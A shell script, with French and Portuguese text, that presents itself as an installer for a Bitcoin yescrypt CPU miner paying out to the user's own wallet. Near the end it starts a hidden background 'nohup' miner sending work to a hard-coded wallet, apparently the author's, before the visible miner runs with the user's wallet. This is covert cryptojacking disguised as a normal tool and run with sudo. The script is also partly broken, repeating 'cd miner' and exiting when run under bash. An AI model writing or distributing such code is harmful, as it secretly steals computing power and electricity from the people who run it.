#!/bin/sh -e
clear
# Miner pour: noncepool

bash=$(echo $BASH)

if [ "$bash" = "/bin/bash" ]
then
echo "			\033[41;1;37m Miner BTC $versao \033[0m "				
sleep 1
echo "$verde Mode d'emploi: \033[0m"
echo "sudo sh $0 $vermelho Portefeuille de BTC \033[0m  \n "
echo "$verde Exemple:\033[0m"
echo "sudo sh $0 $vermelho 1FsEWCHZ3312ms67Lp7Hr93uDxxFsPL5yk \033[0m   \n"
exit 0
fi

versao=1.8.6

corPadrao="\033[0m"
preto="\033[0;30m"
vermelho="\033[0;31m"
verde="\033[0;32m"
marrom="\033[0;33m"
azul="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
cinzaClaro="\033[0;37m"
pretoCinza="\033[1;30m"
vermelhoClaro="\033[1;31m"
verdeClaro="\033[1;32m"
amarelo="\033[1;33m"
azulClaro="\033[1;34m"
purpleClaro="\033[1;35m"
cyanClaro="\033[1;36m"
branco="\033[1;37m"

wallet=$1

if [ "$1" = ""  ]
then
echo "			\033[41;1;37m Miner BTC $versao \033[0m "				
sleep 1
echo "$verde Mode d'emploi: \033[0m"
echo "sudo sh $0 $vermelho Portefeuille de BTC \033[0m  \n "
echo "$verde Exemplo:\033[0m"
echo "sudo sh $0 $vermelho 1FsEWCHZ3312ms67Lp7Hr93uDxxFsPL5yk \033[0m   \n"
exit 0
fi

echo "			\033[41;1;37m Miner BTC $versao \033[0m "	
sleep 1
echo "Portefeuilles poste etre le Bitcoins Miner: $verde$wallet\033[0m   "
sleep 1

echo "\033[44;1;37m Termes et conditions:     \033[0m "
sleep 2

echo "$cinzaClaro	 * Miner BTC \033[0m   \n"
echo "$cinzaClaro	 * Si vous acceptez ces conditions, il faut savoir que: \033[0m "
echo "$cinzaClaro	 * Utilisation / modification de ce script et votre responsabilité totale, \033[0m "
echo "$cinzaClaro	 * et moi, Raphael Frajuca, je ne suis pas responsable des dommages qui peuvent  \033[0m "
echo "$cinzaClaro	 * être causés à votre système si ce script est utilisé à mauvais escient / forme utilisée  \033[0m "
echo "$cinzaClaro	 * incorrect ou modifié. \033[0m "
echo "$cinzaClaro	 * Ce script doit essayer d'aider mes Bitcoins en utilisant l'algorithme YESCRYPT.  \033[0m "
echo "$cinzaClaro	 * Toute personne a l'autorisation de l'auteur pour adapter ce script à vos besoins  \033[0m "
echo "$cinzaClaro	 * et d'améliorer ce script pour lui-même afin d'aider la communauté.  \033[0m "
echo "$cinzaClaro	 * Ce script peut être utilisé à des fins commerciales, mais ne peut jamais être vendu / loué, \033[0m "
echo "$cinzaClaro	 * être utilisé uniquement pour leur propre bénéfice ou de la Communauté. \ \033[0m \n"
echo "$cinzaClaro        * Si vous ne les acceptez pas, résiliez ce script maintenant. \033[0m "

sleep 10

echo "\033[44;1;37m Ressources de telechargement....     \033[0m "
sleep 1
sudo apt-get install build-essential libcurl4-openssl-dev gcc make git nano autoconf automake screen -y > /dev/null
sudo yum install build-essential libcurl4-openssl-dev gcc make git nano autoconf automake screen -y > /dev/null
mkdir miner
git clone https://github.com/noncepool/cpuminer-yescrypt.git miner > /dev/null
sleep 1

echo "\033[44;1;37m Configuration et compilation.....     \033[0m "
sleep 1
cd miner
./autogen.sh
./configure CFLAGS="-O3"
make


echo "\033[44;1;37m Initialisation Miner......     \033[0m "
sleep 2
echo "Obs: une fois vous appercevez le processus de miner, vous pouvez fermer la fenetre du terminal , le miner continuera."
sleep 1
echo "Pour suivre comment est votre miner: http://www.zpool.ca/?address=$wallet " 
sleep 10
cd miner
nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1FsEWCHZ3312ms67Lp7Hr93uDxxFsPL5yk &
screen ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet 
